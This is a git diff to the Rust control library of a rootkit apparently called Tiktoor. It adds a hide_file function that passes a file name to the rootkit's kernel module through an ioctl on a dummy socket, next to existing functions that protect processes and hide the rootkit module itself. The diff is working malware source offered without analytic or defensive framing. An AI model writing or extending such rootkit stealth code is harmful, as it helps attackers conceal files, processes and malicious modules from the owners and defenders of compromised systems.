@@ -116,6 +116,30 @@ pub fn protect_process(pid: u32) {
     }
 }
 
+#[repr(C)]
+struct FileHidingSubargs {
+    name: *const c_char,
+}
+
+/// Hide file given by its name
+pub fn hide_file(name: &CString) {
+    let subargs = FileHidingSubargs {
+        name: name.as_ptr(),
+    };
+    let cmd_arg = TiktoorCmdArg {
+        action: Action::FileHiding as c_uchar,
+        subargs: &subargs as *const _ as *const c_void,
+    };
+    unsafe {
+        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
+        libc::ioctl(
+            dummy_socket,
+            TIKTOOR_IOCTL_CMD,
+            &cmd_arg as *const _ as *const c_void,
+        );
+    }
+}
+
 /// Hide the rootkit module
 pub fn hide_module() {
     let cmd_arg = TiktoorCmdArg {
